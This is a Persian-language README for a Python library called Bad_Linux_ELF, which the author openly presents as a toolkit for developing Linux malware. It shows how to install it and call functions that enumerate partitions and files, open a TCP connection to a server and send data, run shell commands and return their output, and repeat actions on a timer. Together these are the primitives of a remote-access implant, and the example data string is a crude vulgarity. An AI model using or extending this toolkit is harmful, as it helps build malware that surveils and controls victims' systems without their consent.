# به داکیومنت کتابخونه من خوش امدید!
این یک پروژه کاملا اوپن سورس هست که در راستای توسعه بدافزار با پایتون درحال توسعه است

درون سورس هیچ گونه کد خطرناک یا بدافزاری پنهان نشده است و صرفا در راستای کمک به توسعه بهتر برنامه های پایتونی توسعه یافته است


# نحوه نصب کتابخونه!
کافیه اول با استفاده از گیت سورس داخل همین صفحه رو دانلود کنید به کامند زیر

    git clone https://github.com/6E6L6F/Bad_Linux_ELF
   سپس با یوزر روت آن را نصب کنید
   

    python3 setup.py install

##نحوه فراخوانی کتابخونه و کلاس ها و توابع آن!

پس از نصب کتابخونه کافیه در محیط کد نویسی خود به صورت زیر کلاس اصلی را صدا بزنید

    from ELF_Linux.linux import BadLinux
   تعدادی تابع داخل این کلاس قرار دارد که تمامی آن ها اسینک هستن و برای اجرا شدن آن باید از یک کتابخونه دیگر استفاده کرد به صورت پیش فرض نصب هست
   

    import asyncio
   حالا یک تابع اصلی میسازیم و سپس کلاس را پاس میدهیم به یک متغیر و ان را صدا زده و خروجی ان را خواهیم گرفت
  

    async def main():
		main = BadLinux()
		result = await main.get_partitions()
		print(result)
		    
    asyncio.run(main())
اگر کد زیر را اجرا کنید مقدار برگشتی یک لیست حاوی تعدادی دیکشنری داخلش هست که اسم و ادرس تمامی پارتیشن ها و درایو ها همراه با فرمت انان است

یک مثال ساده از چگونگی اجرای کد 


## کاربرد توابع همراه توضیحات

این کلاس در شروع کار تعداد کمی توابع درون خود دارد که به مرور زمان بیشتر خواهد شد

اما توابع

برای گرفتن لیست کل فایل های ریشه ای یک دایرکتوری از تابع زیر استفاده میکنیم 

    await main.get_files()
##
   برای اتصال یک کانکشن با پروتکل تی سی پی از تابع زیر استفاده میکنیم

    await main.connect_to_server(server_address='192.168.1.12' , port_address='8888' , data=b'man kos mikham')
>   این تابع ۳ پارامتر ورودی میگیره که ایپی ادرس سروری که باید وصل بشه بهشو میگیره و دومی پورت باز سرور و سومی در صورت دلخواه میتوانید یک دیتای را ارسال کنید سمت ان سرور
   و در خروجی یک اینستنس از کانکشن برمیگردونه ک در صورت نیاز میتوانید کار های بسیاری انجام دهید
##
تابع بعدی دستورات سیستمی را اجرا و سپس خروجی ان را به ما میدهد  

    result = await bad.run_command("ls")
    print(result)
##
فعلا ورژن لینوکس این پروژه این تعداد تابع را دارد و به زودی چیز های جدید تری به ان اضافه خواهد شد

## 

## کلاس ریپیت تایمر

این کلاس یک تابع میگیرد و سپس طی مقدار بازه زمانی مشخص ان را اجرا میکند به طور مثال هر ۱۰ ثانیه یکبار

نحوه فراخوانی

    from ELF_Linux.RepeateTime import RepeatedTimer
    
نحوه استفاده

    timer = RepeatedTimer(interval = 10 , functions = main , *args , **kwargs)
   
   برای اجرا
   

    timer.run()

برای قطع کردن آن

    timer.stop()
    

# Contact Me 
Telegram: @E_L_F_6_6_6
 Instagram: @E_L_F_6_6_6
 Rubika: @E_L_F_6_6_6
 Bale: @E_L_F_6_6_6

